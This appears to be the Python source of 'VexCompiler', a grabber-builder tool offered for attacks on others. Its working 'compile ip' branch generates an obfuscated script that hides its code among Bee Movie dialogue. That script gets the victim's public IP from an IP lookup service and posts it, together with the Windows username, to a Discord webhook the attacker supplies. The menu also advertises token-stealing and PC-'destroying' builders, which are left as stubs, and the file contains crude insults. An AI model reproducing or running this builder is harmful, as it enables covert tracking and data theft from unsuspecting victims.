# Libraries ======================+
import os
import time
import sys
import requests
import random

import colorama
from colorama import Fore, Back, Style
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System

# OnLaunch ========================+
colorama.init(autoreset=True)
if sys.platform == "linux" or sys.platform == "linux2":
    osys = "linux"
elif sys.platform == "darwin":
    osys = "osx"
elif sys.platform == "win32":
    osys = "win"

if osys == "win":
    os.system(f"title VexCompiler / Welcome, {os.getlogin()} (Ver. Windows)")

# Variables =======================+
desc = [
    "vex >> vw",
    "hello, "+os.getlogin(),
    "remember that one time "+os.getlogin()+" used VexLog",
    "https://discord.gg/YHynjFuH6v",
    "i hope your having a good day",
    os.getlogin()+"is cute"
]

# Functions =======================+
def error(string):
    Write.Print(f"\n[#] {string}\n",Colors.red_to_yellow, interval=0.005)
def info(string):
    Write.Print(f"\n[!] {string}\n",Colors.blue_to_cyan, interval=0.005)

def cls():
    if osys == "linux":
        os.system("clear")
    elif osys == "osx":
        os.system("clear")
    elif osys == "win":
        os.system("cls")

def checkconfig():
    if not os.path.exists("Compiled"):
        config = os.mkdir("Compiled")

banner = f"""                            
█░█ █▀▀ ▀▄▀ ░░▄▀ █▀▀ █▀█ █▀▄▀█ █▀█ █ █░░ █▀▀ █▀█
▀▄▀ ██▄ █░█ ▄▀░░ █▄▄ █▄█ █░▀░█ █▀▀ █ █▄▄ ██▄ █▀▄
3 Types of compiles / 2 Loggers / {random.choices(desc)}
"""

loader = f"""
__________________________________
_/\/\__/\/\___/\/\/\___/\/\__/\/\_ 
_/\/\__/\/\_/\/\/\/\/\___/\/\/\___  
___/\/\/\___/\/\_________/\/\/\___   
_____/\_______/\/\/\/\_/\/\__/\/\_    
__________________________________     
""" 

# Vex Logger ======================+
colorama.init(autoreset=True)

Anime.Fade(Center.Center(loader), Colors.red_to_purple, Colorate.Vertical, 6)
System.Clear()

def showlogo():
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(banner)))

cls()
showlogo()

info("Type compilers for all compiled scripts")

def vexcm():

    # Command Input
    cmd = input(Fore.YELLOW+f"Compile %\n{Fore.LIGHTBLACK_EX}")

    # Obfuscation Vars
    randomstrings = ["""Narrator: According to all known laws of aviation, there is no way that a bee should be able to fly. Its wings are too small to get its fat little body off the ground. The bee, of course, flies anyway because bees don't care what humans think is impossible. cut to Barry's room, where he's picking out what to wear Barry Yellow, black. Yellow, black. Yellow, black. Yellow, black. Ooh, black and yellow! Yeah, let's shake it up a little. Mom (Janet Benson) (calling from downstairs:) Barry! Breakfast is ready! Barry: Coming! (phone rings) Oh, hang on a second. (adjusts his antennas into a headset) Hello? Adam Flayman (on the phone) Barry? Barry: Adam? Adam: Can you believe this is happening? Barry: I can't believe it. I'll pick you up. (hangs up, sharpens his stinger) Lookin' sharp. (flies downstairs) Mom: Barry, why don't you use the stairs? Your father paid good money for those. Barry: Sorry. I'm excited. Dad (Martin Benson): Here's the graduate. We're very proud of you, son. And a perfect report card, all B's. Mom: Very proud. (touches Barry's hair) Barry: Ma! I got a thing going here. Mom: Ah, you got some lint on your fuzz. Barry: Ow! That's me! Dad: Wave to us! We'll be in row 118,000. Barry: Bye! (flies off) Mom: Barry, I told you, stop flying in the house! (Barry drives his car to pick up his classmate. Adam's outside his house, reading the Hive Today newspaper. The front page headline reads "FRISBEE HITS HIVE ! Internet Down. Bee: 'I heard sound, then Wham-o!'") Barry: Hey, Adam. Adam: Hey, Barry. Is that fuzz gel? Barry: A little. It's a special day, finally graduating. Adam: Never thought I'd make it. Barry: Yeah, three days grade school, three days high school. Adam: Those were so awkward. Barry: Three """]
    
    russo = ["""Rasskazchik: Soglasno vsem izvestnym zakonam aviatsii, pchela ne mozhet letat'. Yego kryl'ya slishkom maly, chtoby otorvat' yego tolstoye malen'koye telo ot zemli. Pchela, konechno, vse ravno letayet, potomu chto pchelam vse ravno, chto lyudi schitayut nevozmozhnym. Komnata Barri, gde on vybirayet, chto nadet', Barri Zheltyy, chernyy. Zheltyy, chernyy. Zheltyy, chernyy. Zheltyy, chernyy. O, cherno-zheltyy! Da, davayte nemnogo vstryakhnemsya. Mama (Dzhanet Benson) (zvonit snizu:) Barri! Zavtrak gotov! Barri: Idu! (zvonit telefon) O, podozhdite sekundu. (nastraivayet svoi antenny v naushniki) Allo? Adam Fleyman (po telefonu) Barri? Barri: Adam? Adam: Ty mozhesh' poverit', chto eto proiskhodit? Barri: Ne mogu v eto poverit'. YA tebya podberu. (veshayet trubku, tochit zhalo) Vyglyadit ostro. (letit vniz) Mama: Barri, pochemu by tebe ne podnyat'sya po lestnitse? Tvoy otets zaplatil za nikh khoroshiye den'gi. Barri: Prosti. YA vzvolnovan. Papa (Martin Benson): Vot vypusknik. My ochen' gordimsya toboy, synok. I ideal'nyy tabel' uspevayemosti, vse chetverki. Mama: Ochen' gorzhus'. (kasayetsya volos Barri) Barri: Ma! U menya tut delo. Mama: A, u tebya pukh na pukhu. Barri: Oy! Eto ya! Papa: Pomashite nam! My budem v ryadu 118,000. Barri: Poka! (uletayet) Mama: Barri, ya zhe govorila, perestan' letat' v dome! (Barri yedet na svoyey mashine, chtoby zabrat' svoyego odnoklassnika. Adam stoit vozle svoyego doma i chitayet gazetu «Uley segodnya». Zagolovok na pervoy polose glasit: «FRISBI POPADAYET V ULEY! Internet otklyuchen. Pchela: «YA uslyshala zvuk, a potom bats!»») Barri: Privet, Adam. Adam: Privet, Barri. Eto pushistyy gel'? Barri: Nemnogo. Eto osobennyy den', nakonets-to vypusknoy. Adam: Nikogda ne dumal, chto u menya poluchitsya. Barri: Da, tri dnya v nachal'noy shkole, tri dnya v starshey shkole. Adam: Eto bylo tak nelovko. Barri: Trekhdnevnyy kolledzh. YA rad, chto odnazhdy vyrvalsya posredi ul'ya i prosto puteshestvoval avtostopom po ul'yu. Adam: Ty vernulsya drugim. (krik pchely, kogda oni proyezzhayut mimo) Pchela: Privet, Barri. Barri: Ey, Arti, otrastil usy? Vyglyadit neplokho. Adam: Ey, ty slyshal o Frenki? Barri: Aga. Adam: Ty idesh' na yego pokhorony? Barri: Net, ya ne poydu na yego pokhorony. Vse znayut, """]

    # Return Command
    if cmd.lower() == "compile ip":
        try:
            checkconfig()
            Write.Print("Methods: Strings / Russian\n",Colors.rainbow, interval=0.005)
            obf = Write.Input(f"Obfuscation Method: ",Colors.rainbow, interval=0.005)
            filename = Write.Input(f"File Name: ",Colors.rainbow, interval=0.005)
            webhook = Write.Input(f"Webhook: ",Colors.rainbow, interval=0.005)
            if obf.lower() == "strings":
                obftype = random.choices(randomstrings)
            elif obf.lower() == "russian":
                obftype = random.choices(russo)
            Write.Print("[0]: Semi-Securing webhook link\n",Colors.rainbow, interval=0.005)
            sechook = webhook.split("/")
            Write.Print("[0a]: Splitting Webhook\n",Colors.rainbow, interval=0.005)
            Write.Print("[0b]: Finished Webhook Splitting // basically made secure a lil\n",Colors.rainbow, interval=0.005)
            newlog = open(f"Compiled/{filename}"+".py", "w+")
            Write.Print("[1]: Getting random strings/booleans\n",Colors.rainbow, interval=0.005)
            Write.Print("[2]: Writing File\n",Colors.rainbow, interval=0.005)
            newlog.write(f"""
#  ================================
# |         Dex's Compiler         |
#  ================================
#  Please do not mess with the code
#  Reach me on discord dex.lol#1337

'''dex.lol#1377'''
'''''';{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};''''''
'''{random.choices(obftype)}''';import os;import requests;'''{random.choices(obftype)}''';import dhooks;{random.choices(obftype)}
'''{random.choices(obftype)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht";{random.choices(russo)}
'''{random.choices(obftype)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";l2="{sechook[2]+"/"}";{random.choices(obftype)};''''{random.choices(obftype)}'''
'''{random.choices(obftype)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''{random.choices(obftype)}''';l6="{sechook[6]}";{random.choices(obftype)}
'''{random.choices(obftype)}''';{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};'''dexIIIlIlIlllIllIIIIllIlIII'''
'''{random.choices(obftype)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";user=os.getlogin();{random.choices(obftype)};l3="{sechook[3]+"/"}";dexIlIlIlIllllllIIIIllIIllIlI=dhooks.Webhook;'''{random.choices(russo)}'''
'''{random.choices(obftype)}''';dexIlIlIlIlllIllIIIIIIIIII=requests;'''voidwatch is gay'''
'''{random.choices(obftype)}''';l0="{sechook[0]+"//"}";{random.choices(obftype)};{random.choices(obftype)};l4="{sechook[4]+"/"}";'''{random.choices(obftype)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(obftype)}''';{random.choices(obftype)};{random.choices(obftype)}
'''{random.choices(obftype)}''';{random.choices(obftype)};'''{random.choices(obftype)}''';dexIlIlIlIlllIllIIIIlIIIIII="org";'''{random.choices(obftype)}''';'''femor when unsucked cock is in there area'''
'''{random.choices(obftype)} {random.choices(obftype)}''';'''dexIIIlIlI''';l5="{sechook[5]+"/"}";dexIlIlIlIlllIllIlIIllIlIll=dexIlIlIlIllllllIIIIllIIllIlI(l0+l2+l3+l4+l5+l6);'''lllIllIIIIllIlIII''';'''er''';''''''
'''{random.choices(obftype)} ''';dex_gay=False;'''{random.choices(obftype)}''';{random.choices(obftype)};dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
'''{random.choices(obftype)} {random.choices(obftype)}''';{random.choices(obftype)};{random.choices(obftype)};'''{random.choices(obftype)}'''
'''{random.choices(obftype)}''';dexIIIlIlIlllIllIIIIllIlIII=dexIlIlIlIlIIlllIIIIllIlIlI(dexIlIlIlIlllIllIIIIllIlIlI+dexIlIlIlIlllIllIIIIllIlIII+'://'+dexIlIlIlIlllIllIIIIllIlIll+dexIlIlIlIllllllIIIIllIlIlI+'.'+dexIlIlIlIlllIllIIIIlIIIIII).text;'''{random.choices(obftype)}'''
'''{random.choices(obftype)} ''';{random.choices(obftype)};dexIlIlIlIlllIllIlIIllIlIll.send(user+": "+dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(obftype)}''';pass;{random.choices(obftype)}
'''''';{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};''''''
'''dex.lol#1337'''
            """)
            Write.Print("[/]: File Compiled, sent to Compiled Folder\n",Colors.rainbow, interval=0.005)
            newlog.close()
        except:
            error("error with compiler // go to github to post an issue (provide details!)")
    elif cmd.lower() == "compile token":
        checkconfig()
        filename = input(Fore.YELLOW+f"File Name: ")
        webhook = input(Fore.YELLOW+f"Webhook: ")
        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
        sechook = webhook.split("/")
        print("[0a]: Splitting Webhook")
        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
        newlog = open(f"Compiled/{filename}"+".py", "w+")
        print("[1]: Getting random strings/booleans")
        print("[2]: Writing File")
        newlog.write(f"""
        
        """)
        print("[/]: File Compiled, sent to Compiled Folder")
        newlog.close()
    elif cmd.lower() == "compile fucker":
        checkconfig()
        filename = input(Fore.YELLOW+f"File Name: ")
        webhook = input(Fore.YELLOW+f"Webhook: ")
        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
        sechook = webhook.split("/")
        print("[0a]: Splitting Webhook")
        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
        newlog = open(f"Compiled/{filename}"+".py", "w+")
        print("[1]: Getting random strings/booleans")
        print("[2]: Writing File")
        newlog.write(f"""
#  ================================
# |         Dex's Compiler         |
#  ================================
#  Please do not mess with the code
#  Reach me on discord dex.lol#1337

'''dex.lol#1377'''

        """)
    elif cmd.lower() == "compile all":
        pass
    elif cmd.lower() == "compilers":
        print(f"""
=======================================
Vex Compiler Commands | {random.choices(desc)}
---------------------------------------
[0]: compile ip - compiles a script to
                  grab a targets ip

[1]: compile token - compiles a script
                     to grab a targets
                     token

[2]: compile fucker - compiles a script
                      to "destroy" a
                      targets pc, not
                      fatal

[/]: compile all - compiles all scripts
=======================================
        """)
    elif cmd.lower() == "cls" or cmd.lower() == "clear":
        cls()
        banner()
    else:
        error("Unknown command, try again.")

    # Loop Compiler
    vexcm()


vexcm()


